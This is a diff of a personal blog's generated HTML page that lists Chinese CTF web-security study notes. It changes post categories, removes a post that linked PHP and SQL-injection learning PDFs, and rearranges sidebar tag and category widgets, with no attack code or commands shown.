+      <a data-url="https://wang-inception-point.github.io/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cmvxmm54j000248wkec9hdqoz" data-title="PHP 初期学习笔记（CTF Web 方向）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+    
+  
+    
+    
+    
+      <article id="post-web-安全学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/10/21/web-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
   <time class="dt-published" datetime="2026-10-20T16:00:00.000Z" itemprop="datePublished">2026-10-21</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%91%A8%E6%8A%A5/">第一周周报</a>
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
   </div>
 
   </div>
@@ -2034,7 +1512,7 @@ HTTP&#x2F;HTTPS协议详解（已听讲解，待动手：Burp 抓包逐行拆解
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://wang-inception-point.github.io/2026/10/21/web-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cmvxl6mhm000ssswk4ayu9n7o" data-title="Web 安全学习笔记（99 条知识清单）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://wang-inception-point.github.io/2026/10/21/web-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cmvxmm54l000648wk53677kkg" data-title="Web 安全学习笔记（99 条知识清单）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -2047,70 +1525,9 @@ HTTP&#x2F;HTTPS协议详解（已听讲解，待动手：Burp 抓包逐行拆解
 
 
 
-  
-    <article id="post-php-初期学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2026-10-20T16:00:00.000Z" itemprop="datePublished">2026-10-21</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%91%A8%E6%8A%A5/">第一周周报</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP 初期学习笔记（CTF Web 方向）</a>
-    </h1>
   
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>⚠️ <strong>重要提示：下面三个 PDF 一定要打开看！这是完整的 PHP 学习笔记资料包！</strong></p>
-</blockquote>
-<h2 id="📎-配套资料下载"><a href="#📎-配套资料下载" class="headerlink" title="📎 配套资料下载"></a>📎 配套资料下载</h2><h3 id="1-C-vs-PHP-语法对照表-pdf"><a href="#1-C-vs-PHP-语法对照表-pdf" class="headerlink" title="1. C vs PHP 语法对照表.pdf"></a>1. C vs PHP 语法对照表.pdf</h3><p><strong>用途：</strong> 对照 C 语言学 PHP 的语法差异，快速上手</p>
-<p>👉 <a href="/files/C-vs-PHP%E8%AF%AD%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8.pdf">点击打开 &#x2F; 下载 C vs PHP 语法对照表.pdf</a></p>
-<hr>
-<h3 id="2-php-学习文档-WP《sql》-pdf"><a href="#2-php-学习文档-WP《sql》-pdf" class="headerlink" title="2. php 学习文档 WP《sql》.pdf"></a>2. php 学习文档 WP《sql》.pdf</h3><p><strong>用途：</strong> SQL 注入专题实战文档，CTF Web 核心考点</p>
-<p>👉 <a href="/files/php%E5%AD%A6%E4%B9%A0%E6%96%87%E6%A1%A3WP%E3%80%8Asql%E3%80%8B.pdf">点击打开 &#x2F; 下载 php 学习文档 WP《sql》.pdf</a></p>
-<hr>
-<h3 id="3-PHP-学习笔记-pdf"><a href="#3-PHP-学习笔记-pdf" class="headerlink" title="3. PHP 学习笔记.pdf"></a>3. PHP 学习笔记.pdf</h3><p><strong>用途：</strong> 完整的 PHP 学习笔记，从基础语法到 CTF 实战</p>
-<p>👉 <a href="/files/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.pdf">点击打开 &#x2F; 下载 PHP 学习笔记.pdf</a></p>
-<hr>
-<h2 id="📌-说明"><a href="#📌-说明" class="headerlink" title="📌 说明"></a>📌 说明</h2><p>这三份 PDF 是 PHP 初期学习的完整资料：</p>
-<ul>
-<li><strong>语法对照表</strong> — 快速对照 C 和 PHP 的差异</li>
-<li><strong>SQL 注入 WP</strong> — 实战题目解题报告</li>
-<li><strong>PHP 学习笔记</strong> — 系统的知识点整理</li>
-</ul>
-<p>建议按顺序学习：先看语法对照表 → 再看 PHP 学习笔记 → 最后看 SQL 注入 WP 实战。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://wang-inception-point.github.io/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="cmvxl6mhn000tsswk6eg7feyj" data-title="PHP 初期学习笔记（CTF Web 方向）" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
 </section>
@@ -2118,69 +1535,29 @@ HTTP&#x2F;HTTPS协议详解（已听讲解，待动手：Burp 抓包逐行拆解
           <aside id="sidebar">
   
     
+
+
   <div class="widget-wrap">
-    <h3 class="widget-title">分类</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%91%A8%E6%8A%A5/">第一周周报</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%91%A8%E6%8A%A5/">第二周周报</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OWASP/" rel="tag">OWASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/OWASP/" style="font-size: 10px;">OWASP</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 10px;">周报</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">十一月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">十月 2026</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
+    <h3 class="widget-title">周报</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2026/11/01/2026-W45-%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/">2026-W45 学习周报 - PHP/Web 安全 WP（SQL注入·RCE·反序列化）</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/25/web-security-roadmap/">Web 安全学习路线图（CTF 方向）</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/21/web-%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Web 安全学习笔记（99 条知识清单）</a>
-          </li>
-        
-          <li>
-            <a href="/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP 初期学习笔记（CTF Web 方向）</a>
-          </li>
-        
+      
+        <li><a href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%91%A8%E6%8A%A5/">第二周周报</a></li>
+      
       </ul>
     </div>
   </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%91%A8%E6%8A%A5/">第二周周报</a></li></ul>
+    </div>
+  </div>
+
 
   
 </aside>
